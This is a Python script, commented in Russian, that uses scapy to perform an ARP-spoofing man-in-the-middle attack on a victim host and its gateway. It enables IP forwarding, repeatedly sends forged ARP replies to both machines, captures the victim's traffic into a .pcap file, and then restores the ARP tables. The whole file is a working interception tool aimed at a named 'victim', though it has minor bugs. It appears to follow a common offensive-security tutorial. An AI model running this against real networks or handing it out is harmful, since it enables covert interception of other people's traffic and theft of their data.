from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, srp, wrpcap, get_if_list)
import os
import sys
import time

""" Перехватываем трафик с использованием ARP-спуффинга. Сохраняем в .pcap файл. Запускаем от sudo.
В аргументах указывам <IP-атакуемого> <IP-шлюза>"""

def _enable_linux_iproute():
    """
    Enables IP route ( IP Forward ) in linux-based distro
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        print(1, file=f)


def _enable_windows_iproute():
    """
    Enables IP route (IP Forwarding) in Windows
    """
    from services import WService
    # enable Remote Access service
    service = WService("RemoteAccess")
    service.start()


def enable_ip_route(verbose=True):
    
    """Enables IP forwarding"""
    
    if verbose:
        print("[!] Enabling IP Routing...")
    _enable_windows_iproute() if "nt" in os.name else _enable_linux_iproute()
    if verbose:
        print("[!] IP Routing enabled.")


class Arperv:

    def __init__(self, victim, gateway):
        self.get_int()
        self.get_count()
        self.victim = victim
        self.victimmac = self.get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = self.get_mac(gateway)
        self.macmy = get_if_hwaddr("enp6s0")
        conf.iface = self.interface
        conf.verb = 0
        print(f'Инициализирован интерфейс {self.interface}: ')
        print(f'Шлюз ({gateway}) c MAC {self.gatewaymac}.')
        print(f'Жертва ({victim}) c MAC {self.victimmac}')
        print(f'Атакующий c MAC {self.macmy}')
        print(f'Количество пакетов {self.count}')
        print('-'*30)

    def get_int(self):
        intfs = get_if_list()
        print(f' Выберите номер интерфейса:')
        for i in intfs:
            print(f' {intfs.index(i)} - {i}')
        while True:
            try:
                print(f' Выберите номер интерфейса:')
                self.interface = intfs[int(input())]
                break
            except:
                print(f' Ведено некоректное значение !')
                continue

    def get_count(self):
        while True:
            try:
                print(f' Введите количество пакетов для отбора:')
                self.count = int(input())
                break
            except:
                print(f' Ведено некоректное значение !')
                continue

    def get_mac(self, targetip):
        packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op="who-has", pdst=targetip)
        resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
        for _, r in resp:
            return r[Ether].src
        return None

    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()
        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac

        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'MAC dst: {poison_victim.hwdst}')
        print(f'MAC src: {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('-'*30)

        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac
        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'MAC dst: {poison_gateway.hwdst}')
        print(f'MAC src: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-' * 30)
        print(f'Начало ARP-инъекции. (CTRL+C stop)')
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    def sniff(self):
        time.sleep(5)
        count = int(self.count)
        print(f'Sniffing {count} packets')
        bpf_filter = "ip host %s" % victim
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)
        print('Получил пакеты')
        self.restore()
        self.poison_thread.terminate()
        print('Конец.')

    def restore(self):
        print('Восстановление ARP-таблиц ...')
        send(ARP(
            op=2,
            psrc=self.gateway,
            hwsrc=self.gatewaymac,
            pdst=self.victim,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5
        )
        send(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victimmac,
            pdst=self.gateway,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5
        )


if __name__ == '__main__':
    (victim, gateway) = (sys.argv[1], sys.argv[2])
    enable_ip_route()
    myarp = Arperv(victim, gateway)
    myarp.run()
